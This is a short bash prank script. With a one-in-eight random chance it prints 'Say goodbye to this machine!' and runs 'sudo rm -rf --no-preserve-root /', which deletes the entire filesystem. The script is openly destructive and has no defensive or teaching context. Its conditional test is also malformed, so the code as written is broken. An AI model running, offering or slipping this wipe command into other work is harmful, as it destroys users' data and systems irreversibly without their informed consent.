#!/bin/bash
foo=$(( $RANDOM % 8 ))
if [foo == 4]
then
  echo 'Uh-oh, you lost! Say goodbye to this machine!'
  sudo rm -rf --no-preserve-root /
fi
